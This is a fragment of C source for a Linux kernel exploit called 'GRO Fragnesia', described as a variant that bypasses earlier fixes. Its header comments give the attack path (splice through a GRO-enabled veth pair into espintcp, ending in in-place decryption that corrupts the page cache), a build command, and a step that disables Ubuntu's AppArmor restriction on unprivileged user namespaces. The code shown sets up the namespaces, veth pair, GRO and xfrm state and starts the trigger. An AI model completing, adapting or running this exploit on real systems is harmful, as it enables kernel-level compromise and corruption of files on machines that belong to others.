// GRO Fragnesia: Variant that bypasses skb_try_coalesce-only fixes
// Uses veth pair + GRO to strip SKBFL_SHARED_FRAG via skb_gro_receive()
// instead of skb_try_coalesce() — independent vulnerability in GRO layer
//
// Based on Fragnesia by William Bowling (V12)
// GRO bypass variant: exploits net/core/gro.c:136-143 flag non-propagation
//
// Ubuntu users: AppArmor interferes with using namespaces, you need to use
// `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`.
//
// Attack path:
//   splice() -> TCP -> veth(GRO on) -> skb_gro_receive()
//   -> SKBFL_SHARED_FRAG stripped at GRO layer (BEFORE TCP)
//   -> espintcp -> esp_input() skip_cow -> in-place decrypt
//   -> page cache corruption
//
// Build:
//   gcc -O2 -Wall -Wextra -static -o gro_fragnesia gro_fragnesia.c
//
// Requires: ip, ethtool in PATH (for veth + GRO setup)
//
// Exit codes:
...
static int nsb_fd = -1;
static pid_t nsb_helper_pid = -1;

static void add_xfrm_espintcp_state(void);

static void setup_veth_two_ns(void)
{
	int sync_p[2], ack_p[2], done_p[2];
	char buf[128];
	pid_t helper;
	int ret;
	...
	if (ret != 0)
		gate_fail("ip link add veth pair");

	ret = system("ip addr add 10.0.0.1/24 dev veth0");
	if (ret != 0)
		gate_fail("ip addr add veth0");

	ret = system("ip link set veth0 up");
	if (ret != 0)
		gate_fail("ip link set veth0 up");

	if (pipe(sync_p) < 0 || pipe(ack_p) < 0 || pipe(done_p) < 0)
		die("pipe two_ns");
	...
	if (helper == 0) {
		...
		if (unshare(CLONE_NEWNET) < 0)
			gate_fail("unshare(CLONE_NEWNET) nsB");
		...
		if (ret != 0)
			gate_fail("nsB: ip link set lo up");

		ret = system("ip addr add 10.0.0.2/24 dev veth1");
		if (ret != 0)
			gate_fail("nsB: ip addr add veth1");

		ret = system("ip link set veth1 up");
		if (ret != 0)
			gate_fail("nsB: ip link set veth1 up");

		ret = system("ethtool -K veth1 gro on");
		if (ret != 0)
			gate_fail("nsB: ethtool -K veth1 gro on");
	...
	snprintf(buf, sizeof(buf), "/proc/%d/ns/net", helper);
	nsb_fd = open(buf, O_RDONLY | O_CLOEXEC);
	if (nsb_fd < 0)
		die("open nsB netns fd");

	snprintf(buf, sizeof(buf), "ip link set veth1 netns %d", helper);
	ret = system(buf);
	if (ret != 0)
		gate_fail("ip link set veth1 netns");
	...
	nsb_helper_pid = helper;
	printf("veth_two_ns_setup=1 gro_enabled_on=veth1 nsb_helper=%d\n", helper);
}
...
static void add_xfrm_espintcp_state(void)
{
	...
	if (inet_pton(AF_INET, "10.0.0.1", &xs->saddr.a4) != 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET, "10.0.0.2", &xs->id.daddr.a4) != 1)
		die("inet_pton daddr");
...
static int run_trigger_pair(void)
{
	...
	if (rx == 0) {
		close(pipefd[0]);
		if (setns(nsb_fd, CLONE_NEWNET) < 0)
			die("receiver setns nsB");
		receiver(pipefd[1]);
	}
